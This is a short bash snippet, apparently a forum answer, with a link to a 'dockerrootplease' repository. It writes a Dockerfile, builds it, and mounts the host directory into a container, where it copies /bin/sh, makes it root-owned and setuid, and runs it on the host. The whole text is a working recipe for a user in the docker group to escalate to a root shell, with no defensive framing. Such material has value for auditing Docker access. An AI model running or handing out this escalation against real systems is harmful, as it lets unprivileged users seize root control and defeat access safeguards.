``` bash
cat > Dockerfile
FROM ubuntu:14.04
ENV WORKDIR /stuff
RUN mkdir -p $WORKDIR
VOLUME [ $WORKDIR ]
WORKDIR $WORKDIR
CRLT+C

docker build -t my-docker-image .
docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
./sh
```

Also https://github.com/chrisfosterelli/dockerrootplease
